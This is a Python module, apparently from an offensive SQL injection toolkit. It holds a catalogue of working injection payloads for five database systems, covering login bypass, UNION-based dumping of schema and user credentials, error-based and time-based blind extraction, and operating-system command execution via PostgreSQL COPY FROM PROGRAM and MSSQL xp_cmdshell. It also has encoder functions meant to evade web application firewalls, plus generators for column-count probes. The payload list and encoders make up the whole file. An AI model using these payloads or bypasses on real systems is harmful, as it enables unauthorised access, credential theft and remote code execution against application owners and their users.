"""SQL Injection Workbench, DBMS Dialects, Payload Crafter, and WAF Bypass Encoders."""
import re
import urllib.parse
from typing import Dict, List, Any

# DBMS Dialect Definitions & Cheatsheets
DBMS_PAYLOADS: Dict[str, List[Dict[str, str]]] = {
    "SQLite": [
        {
            "name": "Auth Bypass (Basic True)",
            "category": "Auth Bypass",
            "payload": "' OR 1=1--",
            "desc": "Universal boolean auth bypass for standard SQL query."
        },
        {
            "name": "Auth Bypass (Closing Quote Match)",
            "category": "Auth Bypass",
            "payload": "' OR '1'='1",
            "desc": "Useful when comments are stripped or filtered."
        },
        {
            "name": "Admin User Forcing",
            "category": "Auth Bypass",
            "payload": "admin'--",
            "desc": "Forces login as admin by commenting out password verification."
        },
        {
            "name": "Version Extraction",
            "category": "Information Disclosure",
            "payload": "' UNION SELECT null,sqlite_version()--",
            "desc": "Extracts SQLite engine version."
        },
        {
            "name": "Extract Table Names (sqlite_master)",
            "category": "Schema Enumeration",
            "payload": "' UNION SELECT null,group_concat(tbl_name) FROM sqlite_master WHERE type='table'--",
            "desc": "Dumps all table names separated by commas."
        },
        {
            "name": "Extract Table Schema / SQL CREATE Statement",
            "category": "Schema Enumeration",
            "payload": "' UNION SELECT null,sql FROM sqlite_master WHERE type='table'--",
            "desc": "Dumps full column definitions and table structures."
        },
        {
            "name": "Extract Column Data (Flag / Users)",
            "category": "Data Exfiltration",
            "payload": "' UNION SELECT null,group_concat(username || ':' || password) FROM users--",
            "desc": "Concatenates credentials/flags across all rows."
        }
    ],
    "MySQL / MariaDB": [
        {
            "name": "Auth Bypass (Hash Comment)",
            "category": "Auth Bypass",
            "payload": "admin'#",
            "desc": "MySQL-specific comment bypass."
        },
        {
            "name": "Auth Bypass (Inline Comment)",
            "category": "Auth Bypass",
            "payload": "' /*!50000OR*/ 1=1#",
            "desc": "Version-specific comment execution to evade WAFs."
        },
        {
            "name": "Version & User Disclosure",
            "category": "Information Disclosure",
            "payload": "' UNION SELECT null,CONCAT(@@version, ' | ', user(), ' | ', database())#",
            "desc": "Dumps MySQL version, active database user, and database name."
        },
        {
            "name": "Extract Table Names (information_schema)",
            "category": "Schema Enumeration",
            "payload": "' UNION SELECT null,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#",
            "desc": "Extracts all tables in current database."
        },
        {
            "name": "Extract Columns for Table",
            "category": "Schema Enumeration",
            "payload": "' UNION SELECT null,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'#",
            "desc": "Extracts columns from specified table."
        },
        {
            "name": "Error-Based (ExtractValue XML)",
            "category": "Error-Based",
            "payload": "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version)))#",
            "desc": "Triggers XML parsing error leaking query result into error message."
        },
        {
            "name": "Error-Based (UpdateXML)",
            "category": "Error-Based",
            "payload": "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)#",
            "desc": "Triggers XPath error leaking database user."
        },
        {
            "name": "Time-Based Blind (SLEEP)",
            "category": "Time-Based Blind",
            "payload": "' OR IF(1=1, SLEEP(5), 0)#",
            "desc": "Delays server response by 5 seconds if condition is true."
        }
    ],
    "PostgreSQL": [
        {
            "name": "Auth Bypass (Double Dash)",
            "category": "Auth Bypass",
            "payload": "' OR 1=1--",
            "desc": "Standard PostgreSQL comment bypass."
        },
        {
            "name": "Version & Current DB",
            "category": "Information Disclosure",
            "payload": "' UNION SELECT null,version() || ' ' || current_database()--",
            "desc": "Extracts PostgreSQL version and current DB."
        },
        {
            "name": "Extract Table Names",
            "category": "Schema Enumeration",
            "payload": "' UNION SELECT null,string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'--",
            "desc": "Aggregates table names into a single string."
        },
        {
            "name": "Error-Based (CAST integer)",
            "category": "Error-Based",
            "payload": "' AND 1=CAST((SELECT version()) AS int)--",
            "desc": "Casting string output to integer forces error message with full version."
        },
        {
            "name": "Time-Based Blind (pg_sleep)",
            "category": "Time-Based Blind",
            "payload": "'; SELECT pg_sleep(5);--",
            "desc": "Stacked query executing 5-second sleep."
        },
        {
            "name": "Stacked Command Execution (COPY PROGRAM)",
            "category": "RCE",
            "payload": "'; COPY users FROM PROGRAM 'id > /tmp/out';--",
            "desc": "RCE via PostgreSQL COPY PROGRAM feature if superuser."
        }
    ],
    "MSSQL": [
        {
            "name": "Auth Bypass",
            "category": "Auth Bypass",
            "payload": "admin'--",
            "desc": "Standard MSSQL auth bypass."
        },
        {
            "name": "Version & User",
            "category": "Information Disclosure",
            "payload": "' UNION SELECT null,@@version + ' | ' + user_name()--",
            "desc": "Dumps Microsoft SQL Server version and DB user."
        },
        {
            "name": "Error-Based (Conversion Error)",
            "category": "Error-Based",
            "payload": "' AND 1=CONVERT(int, (SELECT @@version))--",
            "desc": "Converts version string into integer, triggering error leak."
        },
        {
            "name": "Time-Based Blind (WAITFOR DELAY)",
            "category": "Time-Based Blind",
            "payload": "'; WAITFOR DELAY '0:0:5';--",
            "desc": "Stacked query pausing execution for 5 seconds."
        },
        {
            "name": "Command Execution (xp_cmdshell)",
            "category": "RCE",
            "payload": "'; EXEC xp_cmdshell 'whoami';--",
            "desc": "Executes OS command if xp_cmdshell is enabled."
        }
    ],
    "Oracle": [
        {
            "name": "Auth Bypass",
            "category": "Auth Bypass",
            "payload": "' OR 1=1--",
            "desc": "Oracle comment bypass."
        },
        {
            "name": "Version (FROM dual)",
            "category": "Information Disclosure",
            "payload": "' UNION SELECT null,banner FROM v$version WHERE rownum=1--",
            "desc": "Oracle requires explicit FROM dual or table in UNION queries."
        },
        {
            "name": "Extract All Tables (all_tables)",
            "category": "Schema Enumeration",
            "payload": "' UNION SELECT null,table_name FROM all_tables WHERE rownum <= 10--",
            "desc": "Enumerates accessible tables."
        },
        {
            "name": "Time-Based Blind (DBMS_PIPE)",
            "category": "Time-Based Blind",
            "payload": "' AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a', 5) FROM dual)--",
            "desc": "Pauses execution for 5 seconds in Oracle."
        }
    ]
}

# WAF Tamper Encoders
def tamper_inline_comments(query: str) -> str:
    """Replaces spaces with inline SQL comments (/**/)."""
    return re.sub(r"\s+", "/**/", query.strip())

def tamper_mysql_version_comments(query: str) -> str:
    """Wraps keywords in MySQL version-executing comments /*!50000...*/."""
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER BY", "GROUP BY", "LIMIT", "INSERT", "UPDATE", "DELETE"]
    res = query
    for kw in keywords:
        res = re.sub(rf"\b{kw}\b", f"/*!50000{kw}*/", res, flags=re.IGNORECASE)
    return res

def tamper_random_case(query: str) -> str:
    """Randomly alternates casing of alphanumeric characters."""
    import random
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in query)

def tamper_space_to_newline(query: str) -> str:
    """Replaces spaces with URL-encoded newline (%0a)."""
    return re.sub(r"\s+", "%0a", query.strip())

def tamper_space_to_tab(query: str) -> str:
    """Replaces spaces with URL-encoded tab (%09)."""
    return re.sub(r"\s+", "%09", query.strip())

def tamper_string_to_hex(query: str) -> str:
    """Converts quoted strings like 'admin' into MySQL hex literals like 0x61646d696e."""
    def _to_hex(match):
        s = match.group(1)
        return "0x" + s.encode("utf-8").hex()
    return re.sub(r"'([^']*)'", _to_hex, query)

def tamper_string_to_char(query: str, dbms: str = "MySQL") -> str:
    """Converts quoted strings like 'admin' into CHAR(97,100,109,105,110)."""
    def _to_char(match):
        s = match.group(1)
        if not s:
            return "''"
        codes = ",".join(str(ord(c)) for c in s)
        if dbms == "Oracle":
            return " || ".join(f"CHR({ord(c)})" for c in s)
        return f"CHAR({codes})"
    return re.sub(r"'([^']*)'", _to_char, query)

def tamper_url_encode(query: str) -> str:
    """Standard URL encodes all characters."""
    return urllib.parse.quote(query)

def tamper_double_url_encode(query: str) -> str:
    """Double URL encodes characters (e.g., %2520)."""
    return urllib.parse.quote(urllib.parse.quote(query))

def generate_column_probe(num_cols: int, payload_str: str = "null", dbms: str = "SQLite") -> str:
    """Generates a UNION SELECT column probe with specified column count."""
    cols = [payload_str] * max(1, num_cols)
    from_clause = " FROM dual" if dbms == "Oracle" else ""
    comment = "--" if dbms in ["SQLite", "PostgreSQL", "MSSQL", "Oracle"] else "#"
    return f"' UNION SELECT {', '.join(cols)}{from_clause}{comment}"

def generate_order_by_probe(col_num: int, dbms: str = "SQLite") -> str:
    """Generates an ORDER BY column count probe."""
    comment = "--" if dbms in ["SQLite", "PostgreSQL", "MSSQL", "Oracle"] else "#"
    return f"' ORDER BY {col_num}{comment}"
